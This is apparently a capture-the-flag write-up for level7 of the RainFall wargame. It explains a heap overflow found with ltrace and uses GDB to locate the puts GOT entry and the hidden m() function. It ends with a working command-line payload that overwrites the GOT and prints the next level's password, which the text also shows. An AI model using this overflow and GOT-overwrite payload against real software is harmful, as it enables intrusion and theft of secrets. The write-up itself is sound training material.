# level7

### First analysis

In this level we get a very heavy main and a little m() function not called anywhere as we can see here on this decompiled version of level7:

```c
void m(void *param_1,int param_2,char *param_3,int param_4,int param_5) {
  time_t tVar1;
  
  tVar1 = time((time_t *)0x0);
  printf("%s - %d\n",c,tVar1);
  return;
}

undefined4 main(undefined4 param_1,int param_2) {
  undefined4 *puVar1;
  void *pvVar2;
  undefined4 *puVar3;
  FILE *__stream;
  
  puVar1 = (undefined4 *)malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;
  puVar3 = (undefined4 *)malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;
  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
  __stream = fopen("/home/user/level8/.pass","r");
  fgets(c,0x44,__stream);
  puts("~~");
  return 0;
}
```

To understand more what happens we can check source.c again, let's break down this code step by step:
- First it does some allocations on 2 different variables that we will call addr1 and addr2, addr1[0] = 1 and addr2[0] = 2, then on addr1[1] and addr2[1] we get a new allocation of 8 characters on both.
- It calls strcpy() two times, one to copy into addr1[1] the first argument (av[1]) and same thing with addr2[1] and av[2].
- level8 password file is opened in readonly and read by the program with fgets then stored into c, a global variable.
- Then we simply print two tildes in stdout.

Even if m() is never called we cant analyze it quicky too:
- First it calls the function time() that will gives us a timestamp (long number).
- Then it prints c and the timestamp.

So as we can see one part of the program reads level8's password, and another part that prints it, tho the part that prints it is not accessible. However if it's read, maybe there is some way to find into the stack or the heap this value somewhere, we just have to find how.

### Finding the solution

We first started to look at the core dump. Everytime you get a Segmentation Fault, there is a core dump. This gives a lot of informations on the memory state when the crash occured and we could have a peak on the flag. However this option quicly vanished away as we realized that there is (as far as we know) no way to access this core dump without certains rights that we dont have.

After some more researches we discovers with ltrace this:

```sh
level7@RainFall:~$ ltrace ./level7 "AAAAAAAAAAAAAAAAAAAABBBB" lala
__libc_start_main(0x8048521, 3, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                              = 0x0804a008
malloc(8)                                                                                              = 0x0804a018
malloc(8)                                                                                              = 0x0804a028
malloc(8)                                                                                              = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAABBBB")                                                         = 0x0804a018
strcpy(0x42424242, "lala" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Maybe hard to understand at first glance but what we can see is that if we hit a buffer longer that 20 characters, we seems to be able to overwrite the address of the second strcpy. It now points to 0x42424242 which is the equivalent of BBBB in hex. Interestingly enough this strcpy writes av[2] in this address which makes the segfault. However this means that we can write anything we want, anywhere we want, we just need the address of where we want to write and what we want to write in it.

So we thought about doing like level5 and using the GOT. Since m() uses printf to print the password, if we replace the address of puts() in the got by the address of m(), it would probably print the password. So we first need to get the address in the GOT where puts() is stored:

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:	push   %ebp
   0x08048522 <+1>:	mov    %esp,%ebp
   [...]
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
[...]
```

We see the address of the PLT functions here, let's go deeper:

```
(gdb) disas 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
```

The address with the * next to the first jmp instruction is the address in the GOT where the address of puts is stored, we can verify this:

```
(gdb) x 0x8049928
0x8049928 <puts@got.plt>:	0x08048406
```

It is indeed our puts address. Just as a reminded, we don't care about the right address, only the left one. The right one (0x08048406) is the address of puts that will be replaced, the left address (0x8049928) is where puts is stored. This is the one that we need.

So we have half of what we need, we have where we want to write, now we need to know what we want to write, and for this we just need the address of m():

```
(gdb) x m
0x80484f4 <m>:	0x83e58955
```

We now have both elements, we just need to build our payload that will contains:
- av[1] is 20 random chars + the GOT address
- av[2] is m() address

So we get:

```sh
level7@RainFall:~$ ./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1721760513
```